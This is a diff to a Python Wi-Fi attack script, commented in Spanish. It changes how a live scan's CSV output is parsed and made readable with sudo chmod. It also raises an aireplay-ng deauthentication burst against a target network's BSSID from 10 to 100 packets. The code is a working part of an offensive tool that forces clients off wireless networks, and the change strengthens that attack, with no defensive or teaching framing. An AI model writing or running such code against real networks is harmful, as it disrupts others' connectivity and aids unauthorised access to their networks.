@@ -731,6 +731,7 @@ def menu_captura_vivo():
 
     timestamp = time.strftime("%Y%m%d_%H%M%S")
     archivo_scan = os.path.join(DIRECTORIO_PCAP, f"scan_{timestamp}")
+    archivo_csv = archivo_scan + "-01.csv"
 
     try:
         proc = subprocess.Popen([
@@ -746,13 +747,13 @@ def menu_captura_vivo():
         print()
         proc.terminate()
         proc.wait()
+        subprocess.run(["sudo", "chmod", "a+r", archivo_csv], capture_output=True)
     except KeyboardInterrupt:
         print("\n[OK] Escaneo detenido manualmente.")
         proc.terminate()
         proc.wait()
 
     # --- PASO 3: Parsear CSV y mostrar redes ---
-    archivo_csv = archivo_scan + "-01.csv"
     redes = []
 
     if os.path.exists(archivo_csv):
@@ -760,15 +761,11 @@ def menu_captura_vivo():
             with open(archivo_csv, "r", encoding="utf-8", errors="ignore") as f:
                 lineas = f.readlines()
 
-            seccion_redes = True
             for linea in lineas:
                 linea = linea.strip()
-                if not linea:
-                    seccion_redes = False
+                if not linea or linea.startswith("BSSID") or linea.startswith("Station"):
                     continue
-                if linea.startswith("BSSID") or linea.startswith("Station"):
-                    continue
-                if seccion_redes and "," in linea:
+                if "," in linea:
                     partes = [p.strip() for p in linea.split(",")]
                     if len(partes) >= 14 and len(partes[0]) == 17:
                         bssid = partes[0]
@@ -846,10 +843,10 @@ def menu_captura_vivo():
 
         if usar_deauth == "s":
             time.sleep(5)
-            print("[4] Lanzando deauth (10 paquetes)...")
+            print("[4] Lanzando deauth (100 paquetes)...")
             subprocess.run([
                 "sudo", "aireplay-ng",
-                "--deauth", "10",
+                "--deauth", "100",
                 "-a", objetivo["bssid"],
                 INTERFAZ_MON
             ], capture_output=True)
